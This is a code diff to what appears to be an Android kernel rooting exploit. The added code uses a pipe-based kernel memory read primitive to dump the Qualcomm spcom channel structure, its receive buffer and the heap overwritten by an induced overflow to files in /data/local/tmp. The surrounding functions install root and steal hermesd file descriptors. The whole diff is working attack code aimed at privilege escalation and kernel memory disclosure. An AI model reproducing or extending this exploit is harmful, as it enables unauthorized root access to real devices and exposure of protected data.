@@ -529,9 +529,79 @@ static int install_workqueue_umh_root(int fd) {
           pr_info("overflow: mutex already unlocked (owner=0)\n");
         }
 
+        /* Wait 10 seconds for overflow to be processed, then read channel state */
+        sleep(10);
+
+        /* READ CHANNEL STATE AFTER OVERFLOW! */
+        pr_info("overflow: reading channel state after overflow...\n");
+        FILE *rxlog = fopen("/data/local/tmp/overflow_rxdata.txt", "w");
+        if (rxlog) {
+          fprintf(rxlog, "=== POST-OVERFLOW CHANNEL STATE ===\n\n");
+
+          uint64_t mutex_now = pipe_read64(fd, mutex_addr);
+          uint64_t sync_now = pipe_read64(fd, ch_addr + 0xF8);
+          uint64_t rxptr = pipe_read64(fd, ch_addr + 0x140);
+          uint64_t rxcnt = pipe_read64(fd, ch_addr + 0x148);
+          uint64_t rxsz = pipe_read64(fd, ch_addr + 0x150);
+          uint64_t active = pipe_read64(fd, ch_addr + 0xF0);
+          uint64_t txcnt = pipe_read64(fd, ch_addr + 0x50);
+
+          fprintf(rxlog, "mutex.owner  = %016llx\n", (unsigned long long)mutex_now);
+          fprintf(rxlog, "sync_mutex   = %016llx\n", (unsigned long long)sync_now);
+          fprintf(rxlog, "active_pid   = %016llx\n", (unsigned long long)active);
+          fprintf(rxlog, "tx_count     = %016llx\n", (unsigned long long)txcnt);
+          fprintf(rxlog, "rx_buf_ptr   = %016llx\n", (unsigned long long)rxptr);
+          fprintf(rxlog, "rx_buf_count = %016llx\n", (unsigned long long)rxcnt);
+          fprintf(rxlog, "rx_buf_size  = %016llx\n", (unsigned long long)rxsz);
+
+          pr_info("overflow: rx_buf_ptr=%016llx rxsz=%016llx\n",
+                  (unsigned long long)rxptr, (unsigned long long)rxsz);
+
+          /* Read rx buffer if it exists and is in direct-map range */
+          if (rxptr > 0xffffff8000000000ULL && rxptr < 0xffffff9000000000ULL) {
+            fprintf(rxlog, "\n*** RX BUFFER DATA ***\n");
+            uint8_t rxdata[4096];
+            /* Read up to 4KB of rx buffer */
+            for (int blk = 0; blk < 32; blk++) {
+              pipe_phys_read_data(fd, rxptr + blk * 128, rxdata + blk * 128, 128);
+            }
+            for (int i = 0; i < 4096; i++) {
+              if (i % 32 == 0) fprintf(rxlog, "\n%04x: ", i);
+              fprintf(rxlog, "%02x ", rxdata[i]);
+              if (i % 32 == 31) {
+                fprintf(rxlog, " | ");
+                for (int j = i - 31; j <= i; j++)
+                  fprintf(rxlog, "%c", (rxdata[j] >= 0x20 && rxdata[j] < 0x7f) ? rxdata[j] : '.');
+              }
+            }
+            fprintf(rxlog, "\n");
+          }
+
+          /* Also read 4KB AFTER the channel struct — heap data that was overflowed */
+          fprintf(rxlog, "\n*** HEAP DATA AFTER CHANNEL (overflow zone) ***\n");
+          uintptr_t heap_after = ch_addr + 0x6F8;  /* End of channel struct */
+          uint8_t heapdata[4096];
+          for (int blk = 0; blk < 32; blk++) {
+            pipe_phys_read_data(fd, heap_after + blk * 128, heapdata + blk * 128, 128);
+          }
+          for (int i = 0; i < 4096; i++) {
+            if (i % 32 == 0) fprintf(rxlog, "\n%04x: ", i);
+            fprintf(rxlog, "%02x ", heapdata[i]);
+            if (i % 32 == 31) {
+              fprintf(rxlog, " | ");
+              for (int j = i - 31; j <= i; j++)
+                fprintf(rxlog, "%c", (heapdata[j] >= 0x20 && heapdata[j] < 0x7f) ? heapdata[j] : '.');
+            }
+          }
+
+          fprintf(rxlog, "\n\n=== COMPLETE ===\n");
+          fclose(rxlog);
+          pr_info("overflow: rx data written to /data/local/tmp/overflow_rxdata.txt\n");
+        }
+
         /* Wait for child to finish */
         int wst;
-        waitpid(atk, &wst, 0);
+        waitpid(atk, &wst, WNOHANG);
         pr_info("overflow: child exit=%d\n", WIFEXITED(wst) ? WEXITSTATUS(wst) : -1);
       }
     } else {
@@ -1367,6 +1437,82 @@ int install_android_root(int fd) {
 
     /* Dump spcom driver state */
     dump_spcom_state(fd);
+
+    /* === LIVE CHANNEL DUMP — read from .spcom_channel (direct-mapped!) === */
+    {
+      FILE *chfile = fopen("/data/local/tmp/.spcom_channel", "r");
+      if (chfile) {
+        char chbuf[64] = {0};
+        if (fgets(chbuf, sizeof(chbuf), chfile)) {
+          uintptr_t ch = strtoull(chbuf, NULL, 16);
+          if (ch > 0xffffff8000000000ULL && ch < 0xffffff9000000000ULL) {
+            pr_info("live-dump: channel at %016llx (direct-mapped!)\n", (unsigned long long)ch);
+            FILE *dlog = fopen("/data/local/tmp/channel_live_dump.txt", "w");
+            if (dlog) {
+              fprintf(dlog, "=== LIVE CHANNEL DUMP (DURING OVERFLOW) ===\n");
+              fprintf(dlog, "Channel: %016llx\n\n", (unsigned long long)ch);
+
+              /* Read key fields */
+              uint64_t mutex_owner = pipe_read64(fd, ch + 0x20);
+              uint64_t tx_count = pipe_read64(fd, ch + 0x50);
+              uint64_t rpdev = pipe_read64(fd, ch + 0x98);
+              uint64_t rx_done = pipe_read64(fd, ch + 0xA8);
+              uint64_t active_pid = pipe_read64(fd, ch + 0xF0);
+              uint64_t rx_buf_ptr = pipe_read64(fd, ch + 0x140);
+              uint64_t rx_buf_count = pipe_read64(fd, ch + 0x148);
+              uint64_t rx_buf_size = pipe_read64(fd, ch + 0x150);
+
+              fprintf(dlog, "mutex.owner   = %016llx %s\n", (unsigned long long)mutex_owner,
+                      mutex_owner == 0 ? "(unlocked)" : "(LOCKED!)");
+              fprintf(dlog, "tx_count      = %016llx\n", (unsigned long long)tx_count);
+              fprintf(dlog, "rpdev         = %016llx\n", (unsigned long long)rpdev);
+              fprintf(dlog, "rx_done       = %016llx\n", (unsigned long long)rx_done);
+              fprintf(dlog, "active_pid    = %016llx\n", (unsigned long long)active_pid);
+              fprintf(dlog, "rx_buf_ptr    = %016llx\n", (unsigned long long)rx_buf_ptr);
+              fprintf(dlog, "rx_buf_count  = %016llx\n", (unsigned long long)rx_buf_count);
+              fprintf(dlog, "rx_buf_size   = %016llx\n", (unsigned long long)rx_buf_size);
+
+              /* If rx_buf_ptr is set and in direct-map range, READ THE RESPONSE DATA! */
+              if (rx_buf_ptr > 0xffffff8000000000ULL && rx_buf_ptr < 0xffffff9000000000ULL && rx_buf_size > 0 && rx_buf_size <= 65536) {
+                fprintf(dlog, "\n*** RX BUFFER HAS DATA! Reading %llu bytes... ***\n",
+                        (unsigned long long)rx_buf_size);
+                uint8_t rxdata[4096];
+                size_t to_read = rx_buf_size > 4096 ? 4096 : (size_t)rx_buf_size;
+                for (size_t blk = 0; blk < to_read; blk += 128) {
+                  size_t chunk = (to_read - blk) > 128 ? 128 : (to_read - blk);
+                  pipe_phys_read_data(fd, rx_buf_ptr + blk, rxdata + blk, chunk);
+                }
+                for (size_t i = 0; i < to_read; i++) {
+                  if (i % 32 == 0) fprintf(dlog, "\n  %04zx: ", i);
+                  fprintf(dlog, "%02x ", rxdata[i]);
+                }
+                fprintf(dlog, "\n");
+              }
+
+              /* Also dump full 0x200 bytes of channel struct for analysis */
+              fprintf(dlog, "\n=== RAW CHANNEL STRUCT (512 bytes) ===\n");
+              uint8_t rawch[512];
+              for (int blk = 0; blk < 4; blk++) {
+                pipe_phys_read_data(fd, ch + blk * 128, rawch + blk * 128, 128);
+              }
+              for (int i = 0; i < 512; i++) {
+                if (i % 32 == 0) fprintf(dlog, "\n+%04x: ", i);
+                fprintf(dlog, "%02x ", rawch[i]);
+                if (i % 32 == 31) {
+                  fprintf(dlog, " | ");
+                  for (int j = i - 31; j <= i; j++)
+                    fprintf(dlog, "%c", (rawch[j] >= 0x20 && rawch[j] < 0x7f) ? rawch[j] : '.');
+                }
+              }
+              fprintf(dlog, "\n\n=== DUMP COMPLETE ===\n");
+              fclose(dlog);
+              pr_info("live-dump: written to /data/local/tmp/channel_live_dump.txt\n");
+            }
+          }
+        }
+        fclose(chfile);
+      }
+    }
 
     /* HERMES GOLDEN PATH — steal hermesd fds and probe SPU */
     pr_info("hermes: launching golden path (second-run mode)\n");
